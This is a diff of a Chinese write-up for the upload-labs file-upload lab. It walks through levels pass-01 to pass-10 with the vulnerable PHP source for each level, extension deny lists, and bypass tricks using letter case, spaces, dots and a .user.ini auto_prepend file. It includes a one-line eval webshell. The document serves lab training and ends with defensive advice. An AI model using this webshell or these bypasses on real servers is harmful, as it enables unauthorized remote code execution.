@@ -12,7 +12,7 @@
 
 ## 二、关卡及说明
 
-### pass-01
+### pass-01-JS校验
 
  **说明**：该关卡在前端在JS中对上传文件的后缀进行限制
 
@@ -80,7 +80,7 @@
 
 3、写到最后，实际编程开发中我们应该在安全开发方面注意哪里点呢。其实，从上面的分析就可以得出结论，一是不能只有前端校验，没有后端校验，对于一些可能重大影响程序结果的数据，最好使用前后端结合的校验方式，即保证用户体验，又保障程序安全。另外，在游戏、app等客户端开发时，我们可以通过混淆、加密、加壳等手段尽量防止客户端使用者对关键数据和算法进行逆向分析。
 
-### pass-02
+### pass-02-MIME校验
 
 本关卡源码如下：
 
@@ -126,7 +126,7 @@ image/gif
 
 ![](../../.gitbook/assets/image%20%28617%29.png)
 
-### pass-03
+### pass-03-后缀校验
 
 该关卡源码如下：
 
@@ -185,7 +185,7 @@ if (isset($_POST['submit'])) {
 
 ![](../../.gitbook/assets/image%20%28610%29.png)
 
-### pass-04
+### pass-04-.hatccess
 
 ```php
 $is_upload = false;
@@ -263,7 +263,7 @@ AddType applicaiton/x-httpd-php .jpg
 
 ![](../../.gitbook/assets/image%20%28617%29.png)
 
-### pass-05
+### pass-05-[.user.ini](https://www.jianshu.com/p/c2ed6b05c964)
 
 ```php
 $is_upload = false;
@@ -310,17 +310,193 @@ if (isset($_POST['submit'])) {
 ".htaccess"
 ```
 
-其中，禁止了 .htaccess ，只是在大小写方面没有太多限制，于是，可上传 .Php 结尾的文件。上传成功后，访问：
+于是，可上传文件如下：
 
+{% tabs %}
+{% tab title="1" %}
+{% code title=".user.ini" %}
+```text
+auto_prepend_file=1.gif
+```
+{% endcode %}
 
+文件大意：所有的php文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini
+{% endtab %}
 
-### pass-06
+{% tab title="2" %}
+{% code title="1.gif" %}
+```php
+<?php @eval($_REQUEST['a'])?>
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
 
-### pass-07
+ 上传后，使用连接器连接即可。
 
-### pass-08
+ 注意：phpstudy2016版本默认不会扫描到 .user.ini 文件
+
+### pass-06-后缀大小写
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+由源码可知，本关只是限制了部分后缀，因为上传的脚本文件为PHP的，所以可看到相关限制有：
+
+```text
+".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",
+".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",
+".pHtml",".htaccess",".ini"
+```
+
+所以，可上传后缀为 .Php 的文件，进行绕过
+
+访问结果如下：
+
+![](../../.gitbook/assets/image%20%28617%29.png)
+
+### pass-07-空格
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
+        $file_name = $_FILES['upload_file']['name'];
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file,$img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+ 根据源码，可得：
+
+1. 此关卡中大小写无效
+2. 限制了一些文件后缀
+
+此时，可在burp中抓包，在文件名后面添加空格，来绕过
+
+![](../../.gitbook/assets/image%20%28660%29.png)
+
+之后访问文件：
+
+![](../../.gitbook/assets/image%20%28617%29.png)
+
+### pass-08-点号
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+```
+
+ 文件上传时，添加点号即可完成绕过。
+
+![](../../.gitbook/assets/image%20%28659%29.png)
+
+ 完成上传后，访问文件，效果图如下：
+
+![](../../.gitbook/assets/image%20%28617%29.png)
 
 ### pass-09
+
+```php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+
+```
+
+![](../../.gitbook/assets/image%20%28658%29.png)
 
 ### pass-10
 
@@ -351,8 +527,6 @@ if (isset($_POST['submit'])) {
 3. 对上传的内容进行读取检查；
 4. 不要暴露上传文件的位置；
 5. 禁用上传文件的执行权限；
-
-### 详细版本：
 
 **系统运行时的防御**
 
